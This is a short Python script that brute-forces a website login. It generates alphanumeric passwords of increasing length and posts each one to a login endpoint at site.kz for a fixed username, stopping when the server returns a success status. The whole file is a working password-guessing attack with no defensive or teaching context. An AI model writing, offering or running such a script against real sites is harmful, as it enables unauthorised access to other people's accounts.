import requests
k=0
counter=0
alphabet='0123456789abcdefghijklmnopqrstuvwxyz'
base=len(alphabet)

while True:
    password=''
    i=counter
    while i>0:
        r = i % base
        password= alphabet[r] + password
        i= i // base
    password = alphabet[0] * (k-len(password)) + password
    print(counter,password)
    res=requests.post('http://site.kz/login',json={'login':'login','password':password})
    if res.status_code==200:
        print('success pass is ', password)
        break
    counter+=1
    if password == alphabet[-1] * k:
        k+=1
        counter=0
